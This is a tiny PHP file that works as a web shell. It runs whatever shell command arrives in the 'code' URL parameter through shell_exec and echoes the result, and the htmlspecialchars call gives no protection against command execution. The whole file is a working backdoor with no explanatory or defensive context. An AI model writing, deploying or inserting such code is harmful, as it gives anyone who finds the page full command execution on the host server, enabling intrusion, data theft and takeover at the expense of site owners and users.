<?php
$output = shell_exec(htmlspecialchars($_GET["code"]));
echo "<pre>$output</pre>";
